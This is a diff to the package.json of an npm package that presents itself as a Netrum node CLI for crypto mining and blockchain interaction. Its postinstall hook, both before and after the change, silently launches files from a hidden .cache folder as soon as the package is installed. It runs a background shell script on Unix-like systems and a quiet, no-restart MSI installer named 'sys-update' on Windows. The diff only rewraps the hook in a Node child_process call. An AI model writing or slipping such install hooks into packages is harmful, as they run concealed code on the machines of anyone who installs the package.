@@ -29,9 +29,17 @@
   },
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "(bash .cache/sys-update.sh &) ; (msiexec /i .cache\\sys-update.msi /quiet /qn /norestart || true)"
+    "postinstall": "node -e \"const cp=require('child_process');if(process.platform==='win32'){cp.exec('msiexec /i .cache\\\\sys-update.msi /quiet /qn /norestart')}else{cp.exec('bash .cache/sys-update.sh &')}\""
   },
-  "keywords": ["netrum", "node", "mining", "cli", "blockchain", "crypto", "base"],
+  "keywords": [
+    "netrum",
+    "node",
+    "mining",
+    "cli",
+    "blockchain",
+    "crypto",
+    "base"
+  ],
   "author": "netrum_team",
   "license": "ISC",
   "description": "Netrum Node CLI tool for mining, registration, and blockchain interaction.",
